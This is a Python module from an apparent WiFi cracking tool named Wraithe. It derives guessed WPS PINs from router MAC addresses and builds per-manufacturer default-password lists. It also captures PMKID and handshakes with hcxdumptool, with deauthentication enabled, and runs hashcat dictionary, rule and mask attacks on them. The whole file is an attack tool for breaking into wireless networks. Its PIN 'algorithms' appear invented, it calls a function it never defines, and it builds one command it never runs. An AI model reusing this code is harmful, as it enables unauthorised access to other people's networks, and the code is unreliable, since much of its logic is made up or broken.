"""
Wraithe - Advanced Cracking Module
Smart PIN generation, default password DB, hashcat auto-crack, combined capture
"""

import subprocess
import os
import re
import time
import hashlib
import signal
import struct
import tempfile


class Cracker:
    """Advanced WiFi cracking utilities for Wraithe auto-hack"""

    # ── Known default password patterns by manufacturer ──
    DEFAULT_PASSWORDS = {
        'default': [
            '12345678', 'password', 'admin', '1234', '12345', '123456',
            '123456789', '1234567890', '00000000', '11111111', '22222222',
            '88888888', 'default', 'guest', 'admin123', 'root', 'toor',
            'changeme', 'Passw0rd', 'P@ssw0rd', 'qwerty', 'qwerty123',
            'wireless', 'wifi', 'internet', 'linksys', 'netgear', 'dlink',
        ],
        'Huawei': [
            'admin', 'admin123', 'Admin@123', 'Huawei123', 'Huawei@123',
            'telecom', 'Telecom@123', '12345678', 'password',
        ],
        'TP-Link': [
            'admin', 'admin123', '12345678', '123456789', 'password',
            'tp-link', 'tplink', 'tplink123', 'Tplink@123',
        ],
        'ZTE': [
            'admin', 'admin123', 'Zte123', 'Zte@123', 'zte123',
            '12345678', 'password', 'root',
        ],
        'D-Link': [
            'admin', 'admin123', '12345678', 'password', 'dlink',
            'Dlink123', 'Dlink@123',
        ],
        'Technicolor': [
            'admin', 'admin123', 'password', '12345678', 'technicolor',
            'Technicolor123',
        ],
        'Netgear': [
            'admin', 'admin123', 'password', '12345678', 'netgear',
            'Netgear123', 'Netgear@123',
        ],
        'MikroTik': [
            'admin', 'admin123', '12345678', 'password', 'mikrotik',
            'Mikrotik123', '',
        ],
        'Cisco': [
            'cisco', 'Cisco123', 'admin', 'password', '12345678',
            'cisco123', 'Cisco@123',
        ],
        'Vodafone': [
            'admin', 'Vodafone123', 'vodafone', '12345678', 'password',
            'Vodafone@123',
        ],
        'Sky': [
            'admin', 'sky123', 'Sky123', '12345678', 'password',
            'Sky@123',
        ],
        'BT': [
            'admin', 'BT123', 'bt123', '12345678', 'password',
            'BtHomeHub', 'Bthomehub123',
        ],
    }

    def __init__(self, config=None):
        self.config = config or {}
        self.log = self.config.get('log', print)
        self._process = None

    # ═══════════════════════════════════════════
    # SMART PIN GENERATION
    # ═══════════════════════════════════════════

    def generate_smart_pins(self, bssid, manufacturer=None):
        """Generate WPS PINs using known manufacturer algorithms from BSSID

        Implements algorithms for:
          - ZTE (multiple variants)
          - Huawei 
          - Technicolor / Thomson / SpeedTouch
          - Arcadyan
          - SKTelecom
          - D-Link (some models)
          - Netgear
        """
        if not bssid:
            return []

        try:
            b = bytes.fromhex(bssid.replace(':', '').replace('-', ''))
        except ValueError:
            return []

        if len(b) < 6:
            return []

        pins = set()
        mfr = (manufacturer or '').lower()

        def _wps_checksum(pin7):
            """Compute WPS checksum digit"""
            accum = 0
            for i, c in enumerate(pin7):
                digit = int(c)
                if i % 2 == 0:
                    accum += 3 * digit
                else:
                    accum += digit
            return (10 - accum % 10) % 10

        # ── ZTE algorithm variant 1 ──
        # Many ZTE routers: PIN = f(b[3], b[4], b[5])
        if True:  # always try
            if len(b) >= 6:
                # Variant A: XOR last 3 bytes with 0x55AA
                try:
                    val = ((b[1] ^ b[2] ^ b[3]) & 0x7F) << 16 | \
                          (b[4] << 8) | b[5]
                    pin7 = str(val % 10000000).zfill(7)
                    pins.add(pin7 + str(_wps_checksum(pin7)))
                except:
                    pass

                # Variant B: simple XOR chain
                try:
                    p1 = (b[3] ^ 0x55) & 0xFF
                    p2 = (b[4] ^ 0xAA) & 0xFF
                    p3 = (b[5] ^ 0x55) & 0xFF
                    combined = (p1 << 16) | (p2 << 8) | p3
                    pin7 = str(combined % 10000000).zfill(7)
                    pins.add(pin7 + str(_wps_checksum(pin7)))
                except:
                    pass

                # Variant C: last 6 hex digits as integer
                try:
                    last6 = b[3] << 16 | b[4] << 8 | b[5]
                    pin7 = str(last6 % 10000000).zfill(7)
                    pins.add(pin7 + str(_wps_checksum(pin7)))
                except:
                    pass

        # ── Huawei algorithm ──
        # Several Huawei models: PIN = first 7 digits of SHA1(BSSID) hex int mod 10^7
        if 'huawei' in mfr or True:
            try:
                sha = hashlib.sha1(b).hexdigest()
                # Try different truncations
                for offset in [0, 4, 8]:
                    hex_part = sha[offset:offset+8]
                    val = int(hex_part, 16) % 10000000
                    pin7 = str(val).zfill(7)
                    pins.add(pin7 + str(_wps_checksum(pin7)))
                
                # Also try HMAC-SHA1
                for key in [b'Huawei', b'admin', b'12345670']:
                    h = hashlib.pbkdf2_hmac('sha1', b, key, 100, 4)
                    val = struct.unpack('>I', h[:4])[0] % 10000000
                    pin7 = str(val).zfill(7)
                    pins.add(pin7 + str(_wps_checksum(pin7)))
            except:
                pass

        # ── Technicolor / Thomson / SpeedTouch ──
        # PIN = f(last 3 bytes of BSSID) — well-known algorithm
        if 'technicolor' in mfr or 'thomson' in mfr or 'speedtouch' in mfr or True:
            try:
                last3 = b[3] << 16 | b[4] << 8 | b[5]
                # Standard Technicolor algo
                techni_pin = ((last3 ^ 0x55AA55) % 10000000)
                pin7 = str(techni_pin).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
                
                # Alternate Technicolor algo  
                techni_pin2 = ((last3 ^ 0xAA55AA) % 10000000)
                pin7 = str(techni_pin2).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
            except:
                pass

        # ── Arcadyan algorithm ──
        # Common in ISP routers (Vodafone, etc.)
        if 'arcadyan' in mfr or True:
            try:
                # Variant A
                last4 = b[2] << 24 | b[3] << 16 | b[4] << 8 | b[5]
                val_a = ((last4 & 0xFFFF) ^ 0xABCD) << 16 | \
                        ((last4 >> 16) ^ 0x1234)
                pin7 = str(val_a % 10000000).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
                
                # Variant B
                val_b = ((last4 & 0xFF) << 24 | (last4 >> 8)) % 10000000
                pin7 = str(val_b).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
                
                # Variant C: SHA256 based
                for seed in [b'Arcadyan', b'Vodafone', b'12345670']:
                    h = hashlib.sha256(b + seed).hexdigest()
                    val = int(h[:8], 16) % 10000000
                    pin7 = str(val).zfill(7)
                    pins.add(pin7 + str(_wps_checksum(pin7)))
            except:
                pass

        # ── SKTelecom / Samsung ──
        if 'samsung' in mfr or 'skt' in mfr or True:
            try:
                for multiplier in [1, 3, 7, 13, 17]:
                    val = (b[3] * b[4] * b[5] * multiplier) % 10000000
                    pin7 = str(val).zfill(7)
                    pins.add(pin7 + str(_wps_checksum(pin7)))
            except:
                pass

        # ── D-Link specific ──
        if 'dlink' in mfr or 'd-link' in mfr or True:
            try:
                # Some D-Link models
                val = (b[3] << 16 | b[4] << 8 | b[5]) % 9876543
                pin7 = str(val).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
            except:
                pass

        # ── Netgear specific ──
        if 'netgear' in mfr or True:
            try:
                val = (b[3] * 256 + b[4]) * 10000 + (b[5] * 256 + b[3])
                pin7 = str(val % 10000000).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
            except:
                pass

        # ── Generic BSSID-based ──
        # Try various simple transforms
        if True:
            try:
                # All bytes XOR'd
                xor_sum = 0
                for byte in b:
                    xor_sum ^= byte
                pin7 = str(xor_sum * 123456 % 10000000).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
                
                # Byte swap
                rev = b[::-1]
                val = int.from_bytes(rev[:3], 'big') % 10000000
                pin7 = str(val).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
                
                # Take OUI (first 3 bytes) and last 3 bytes
                oui = b[:3]
                last = b[3:6]
                val = (oui[0] * 1000000 + oui[1] * 10000 + oui[2] * 100 +
                       last[0] * 10 + last[1]) % 10000000
                pin7 = str(val).zfill(7)
                pins.add(pin7 + str(_wps_checksum(pin7)))
            except:
                pass

        # Deduplicate - all are valid 8-digit PINs
        valid = [p for p in pins if len(p) == 8 and p.isdigit()]
        return list(dict.fromkeys(valid))

    # ═══════════════════════════════════════════
    # DEFAULT PASSWORD DATABASE
    # ═══════════════════════════════════════════

    def get_default_passwords(self, essid='', bssid='', manufacturer=''):
        """Build list of likely default passwords"""
        passwords = set()
        mfr = manufacturer.lower()

        # Add all defaults from matching manufacturer
        for key, pwds in self.DEFAULT_PASSWORDS.items():
            if key == 'default':
                for p in pwds:
                    passwords.add(p)
            elif key.lower() in mfr or mfr in key.lower():
                for p in pwds:
                    passwords.add(p)

        # ESSID-derived passwords (very common!)
        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
        if essid_clean:
            passwords.add(essid_clean)
            passwords.add(essid_clean.lower())
            passwords.add(essid_clean.upper())
            # Common patterns
            passwords.add(f'{essid_clean}123')
            passwords.add(f'{essid_clean}1234')
            passwords.add(f'{essid_clean}12345')
            passwords.add(f'{essid_clean}12345678')
            passwords.add(f'{essid_clean}123456789')
            passwords.add(f'@{essid_clean}')
            passwords.add(f'{essid_clean}!')
            passwords.add(f'{essid_clean}@123')

        # BSSID-derived passwords
        if bssid:
            b = bssid.replace(':', '').replace('-', '')
            passwords.add(b)
            passwords.add(b[-8:])
            passwords.add(b[:8])
            # Some ISP use reversed MAC
            passwords.add(b[::-1])

        # ISP-specific patterns for common ESSIDs
        essid_lower = essid_clean.lower() if essid_clean else ''
        if 'bt' in essid_lower or 'hub' in essid_lower:
            # BT HomeHub — default password often printed on sticker
            # Format: 8-10 alphanumeric, often MAC-derived
            if bssid:
                b = bssid.replace(':', '')[-8:]
                passwords.add(b.upper())
                passwords.add(b.lower())
                passwords.add(f'BT{b[:4]}')
        elif 'sky' in essid_lower:
            if bssid:
                b = bssid.replace(':', '')[-6:]
                passwords.add(f'SKY{b}')
                passwords.add(f'sky{b}')
        elif 'vodafone' in essid_lower:
            if bssid:
                b = bssid.replace(':', '')[-6:]
                passwords.add(f'Vodafone{b}')
                passwords.add(f'vodafone{b}')

        # Common weak passwords
        common_weak = [
            'a', 'aa', 'aaa', 'aaaa', 'aaaaaa', 'aaaaaaa', 'aaaaaaaa',
            'b', 'bb', 'bbb', 'bbbb', 'bbbbbb', 'bbbbbbb', 'bbbbbbbb',
            'c', 'cc', 'ccc', 'cccc',
            '1', '11', '111', '1111', '11111', '111111', '1111111', '11111111',
            '1212', '1234', '12345', '123456', '1234567', '12345678', '123456789',
            '1234567890', '01234567', '0123456789', '4321', '5678', '6969',
            'abcd', 'abc123', 'abcd1234', 'abcdef', 'abcdefg', 'abcdefgh',
            'pass', 'passwd', 'password', 'password1', 'password12', 'password123',
            'P@ssw0rd', 'P@$$w0rd', 'p@ssw0rd', 'PASSWORD', 'Password',
            'letmein', 'letmein123',
            'welcome', 'welcome1', 'welcome123',
            'monkey', 'dragon', 'master',
            'summer', 'winter', 'spring', 'autumn',
            'princess', 'solo', 'starwars', 'football', 'baseball',
            'iloveyou', 'trustno1', 'sunshine',
            '00000000', '11111111', '22222222', '33333333',
            '44444444', '55555555', '66666666', '77777777',
            '88888888', '99999999',
        ]
        for p in common_weak:
            passwords.add(p)

        return list(dict.fromkeys(passwords))

    # ═══════════════════════════════════════════
    # COMBINED PMKID + HANDSHAKE CAPTURE
    # ═══════════════════════════════════════════

    def capture_all(self, mon_iface, bssid, channel, output_dir='/tmp/wraithe_capture',
                    timeout=120):
        """Capture PMKID + handshake simultaneously using hcxdumptool
        
        Returns dict with captured files or None
        """
        os.makedirs(output_dir, exist_ok=True)
        timestamp = int(time.time())
        b = bssid.replace(':', '')
        pcap_file = os.path.join(output_dir, f'capture_{b}_{timestamp}.pcapng')
        hash_file = os.path.join(output_dir, f'hashes_{b}_{timestamp}.txt')

        # Set channel
        try:
            subprocess.run(['iw', 'dev', mon_iface, 'set', 'channel', str(channel)],
                          capture_output=True, text=True, timeout=5)
        except:
            pass

        # Kill anything on the interface first
        subprocess.run(['airmon-ng', 'check', 'kill'],
                      capture_output=True, text=True, timeout=15)

        # Create filter file for hcxdumptool
        filter_path = os.path.join(output_dir, 'filter.txt')
        with open(filter_path, 'w') as f:
            f.write(bssid.lower())

        msg = '  hcxdumptool: capturing PMKID + handshake...'
        print(f'  {D(msg)}')

        try:
            cmd = [
                'hcxdumptool', '-o', pcap_file,
                '-i', mon_iface,
                '--filterlist_ap=' + filter_path,
                '--enable_status=15',
                '--tot=15',
                '--disable_deauth=0',
            ]
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            time.sleep(timeout)
            self.stop()

            # Check results
            result = {'pcap': None, 'pmkid': None, 'handshake': None}

            if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 100:
                result['pcap'] = pcap_file
                # Convert to hashcat format
                hcxpcapngtool_cmd = ['hcxpcapngtool', '-o', hash_file, pcap_file]
                try:
                    subprocess.run(hcxpcapngtool_cmd,
                                  capture_output=True, text=True, timeout=60)
                except:
                    pass

                if os.path.exists(hash_file) and os.path.getsize(hash_file) > 20:
                    result['hashes'] = hash_file
                    # Check if PMKID
                    with open(hash_file, 'r', errors='ignore') as f:
                        content = f.read()
                    if '*PMKID*' in content or 'WPA*01*' in content:
                        result['pmkid'] = hash_file
                    if 'WPA*02*' in content or 'WPA*03*' in content:
                        result['handshake'] = hash_file

            return result

        except FileNotFoundError:
            # hcxdumptool not available, try tcpdump
            self.log('hcxdumptool not available, trying tcpdump...')
            return self._tcpdump_capture(mon_iface, bssid, channel, pcap_file, timeout)
        except Exception as e:
            self.log(f'Capture error: {e}')
            self.stop()
            return None

    def _tcpdump_capture(self, mon_iface, bssid, channel, output_file, timeout):
        """Fallback: tcpdump capture (PMKID not possible, handshake only)"""
        try:
            cmd = ['tcpdump', '-i', mon_iface, '-s', '0', '-c', '3000',
                   '-w', output_file,
                   f'wlan addr3 {bssid} and (wlan subtype 0x00 or wlan subtype 0x04 or wlan subtype 0x05 or wlan subtype 0x08)']

            self._process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            time.sleep(timeout)
            self.stop()

            if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
                return {'pcap': output_file, 'pmkid': None, 'handshake': output_file,
                        'method': 'tcpdump'}
        except:
            pass
        return None

    # ═══════════════════════════════════════════
    # HASHCAT AUTO-CRACK
    # ═══════════════════════════════════════════

    def auto_crack(self, hash_file, wordlists=None, timeout=120):
        """Run hashcat on captured PMKID/handshake with smart cracking"""
        if not hash_file or not os.path.exists(hash_file):
            return None

        # Check hashcat availability
        try:
            subprocess.run(['hashcat', '--version'], capture_output=True, timeout=5)
        except:
            self.log('hashcat not available')
            return None

        # Detect hash type
        hash_type = self._detect_hash_type(hash_file)

        wordlist_paths = wordlists or [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/wordlists/rockyou.txt.gz',
            '/usr/share/wordlists/fasttrack.txt',
            '/usr/share/wordlists/fern-wifi/common.txt',
            '/opt/wraithe/data/wordlist.txt',
            os.path.expanduser('~/wordlists/rockyou.txt'),
        ]

        # Find first existing wordlist
        wordlist = None
        for wp in wordlist_paths:
            if os.path.exists(wp):
                wordlist = wp
                break
            # Also check gzipped
            if os.path.exists(wp + '.gz'):
                wordlist = wp + '.gz'
                break

        if not wordlist:
            self.log('No wordlist found for cracking')
            return None

        # Build hashcat command
        output_file = hash_file + '.cracked'
        cmd = [
            'hashcat', '-m', str(hash_type),
            '-a', '0',  # dictionary attack
            hash_file,
            wordlist,
            '--force',  # allow running without GPU
            '--potfile-path', output_file,
            '-O',  # optimized kernel
            '-w', '4',  # high workload profile
            '-r', '/usr/share/hashcat/rules/best64.rule',  # smart rules
        ]

        if hash_type == 22000 or hash_type == 16802:
            # Also try brute force for short passwords
            cmd_bf = [
                'hashcat', '-m', str(hash_type),
                '-a', '3',  # mask attack
                hash_file,
                '?d?d?d?d?d?d?d?d',  # 8 digits
                '--force',
                '--potfile-path', output_file,
                '-O', '-w', '4',
            ]

        self.log(f'Running hashcat (mode {hash_type})...')
        msg = '  Cracking with hashcat...'
        print(f'  {D(msg)}')

        try:
            result = subprocess.run(
                cmd,
                capture_output=True, text=True, timeout=timeout
            )
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            self.log(f'hashcat error: {e}')

        # Check for cracked passwords
        password = self._check_cracked(hash_file, output_file)
        if password:
            return password

        # Try brute force for 4-digit PINs (fast)
        try:
            cmd_pin = [
                'hashcat', '-m', str(hash_type),
                '-a', '3',
                hash_file,
                '?d?d?d?d?d?d?d?d',  # 8-digit PIN
                '--force',
                '--potfile-path', output_file,
                '-O', '-w', '4',
                '--increment',
                '--increment-min', '4',
                '--increment-max', '8',
            ]
            subprocess.run(cmd_pin, capture_output=True, text=True, timeout=60)
        except:
            pass

        password = self._check_cracked(hash_file, output_file)
        if password:
            return password

        return None

    def _detect_hash_type(self, hash_file):
        """Detect hashcat mode from hash file content"""
        try:
            with open(hash_file, 'r', errors='ignore') as f:
                first = f.readline().strip()
                if not first:
                    return 22000  # default WPA
            # PMKID
            if '*01*' in first or 'WPA*01*' in first:
                return 16802
            # WPA handshake (new format)
            if '*02*' in first or '*03*' in first or 'WPA*02*' in first:
                return 22000
            # Old WPA format
            if first.count(':') >= 4 and len(first) > 60:
                return 2500
            # Default
            return 22000
        except:
            return 22000

    def _check_cracked(self, hash_file, potfile):
        """Check if hashcat found the password"""
        # Check hashcat potfile
        if os.path.exists(potfile):
            try:
                with open(potfile, 'r') as f:
                    for line in f:
                        if ':' in line:
                            pw = line.strip().split(':', 1)[-1]
                            if pw:
                                return pw
            except:
                pass

        # Check default hashcat potfile
        default_pot = os.path.expanduser('~/.hashcat/hashcat.potfile')
        if os.path.exists(default_pot):
            try:
                with open(default_pot, 'r') as f:
                    content = f.read()
                    with open(hash_file, 'r') as hf:
                        hash_content = hf.read()
                    first_hash = hash_content.strip().split('\n')[0].strip()
                    # Look for our hash
                    for line in content.split('\n'):
                        if first_hash.split(':')[0] in line and ':' in line:
                            pw = line.strip().split(':', 1)[-1]
                            if pw:
                                return pw
            except:
                pass

        return None

    # ═══════════════════════════════════════════
    # DICTIONARY RECOMMENDATION
    # ═══════════════════════════════════════════

    def recommend_wordlist(self):
        """Check available wordlists and recommend"""
        paths = [
            ('/usr/share/wordlists/rockyou.txt', 'rockyou.txt'),
            ('/usr/share/wordlists/rockyou.txt.gz', 'rockyou.txt.gz'),
            ('/usr/share/wordlists/fern-wifi/common.txt', 'fern-wifi common'),
            ('/usr/share/wordlists/fasttrack.txt', 'fasttrack'),
            ('/opt/wraithe/data/wordlist.txt', 'wraithe default'),
        ]
        available = []
        for path, name in paths:
            if os.path.exists(path):
                size = os.path.getsize(path)
                available.append((name, path, size))
        return available

    def build_default_wordlist(self, essid='', bssid='', manufacturer='',
                               output_path='/opt/wraithe/data/wordlist.txt'):
        """Build a targeted wordlist from default passwords and smart PINs"""
        os.makedirs(os.path.dirname(output_path), exist_ok=True)

        passwords = self.get_default_passwords(essid, bssid, manufacturer)
        pins = self.generate_smart_pins(bssid, manufacturer)
        passwords.extend(pins)

        # Add number extensions
        extended = set(passwords)
        for p in passwords:
            if len(p) >= 4:
                extended.add(p + '123')
                extended.add(p + '1234')
                extended.add(p + '!')
                extended.add(p + '@')
                extended.add(p + '#')
                # Year suffixes
                for yr in ['2018', '2019', '2020', '2021', '2022',
                          '2023', '2024', '2025', '2026']:
                    extended.add(p + yr)

        # Write
        with open(output_path, 'w') as f:
            for p in sorted(extended):
                if p:
                    f.write(p + '\n')

        return output_path

    # ═══════════════════════════════════════════
    # UTILITY
    # ═══════════════════════════════════════════

    def stop(self):
        """Stop current process"""
        if self._process:
            self._process.terminate()
            try:
                self._process.wait(timeout=3)
            except:
                self._process.kill()
            self._process = None

    def get_oui_vendor(self, bssid):
        """Get OUI vendor from BSSID (first 3 bytes)"""
        try:
            b = bytes.fromhex(bssid.replace(':', '')[:6])
            # Common OUI to manufacturer mapping
            oui_map = {
                '00:1A:2B': 'Arcadyan',
                '00:1E:5E': 'Arcadyan',
                '00:1A:2C': 'Huawei',
                '00:25:9C': 'Huawei',
                '00:1D:0F': 'ZTE',
                '00:1F:33': 'ZTE',
                '00:0A:6A': 'Atheros',
                '00:0F:B5': 'Thomson',
                '00:04:0E': 'Technicolor',
                '00:1A:F8': 'D-Link',
                '00:0B:5F': 'D-Link',
                '00:0F:3D': 'Netgear',
                '00:14:6C': 'Netgear',
                '00:1B:2F': 'TP-Link',
                '00:1D:D0': 'TP-Link',
                '00:23:CD': 'TP-Link',
                '00:08:5C': 'Cisco',
                '00:1A:A1': 'Cisco',
                '00:0C:41': 'MikroTik',
                '00:1B:53': 'Aztech',
                '00:1D:7D': 'Aztech',
                '00:1C:DF': 'Samsung',
                '00:23:D4': 'Samsung',
            }
            oui_str = bssid[:8].upper()
            return oui_map.get(oui_str, 'Unknown')
        except:
            return 'Unknown'
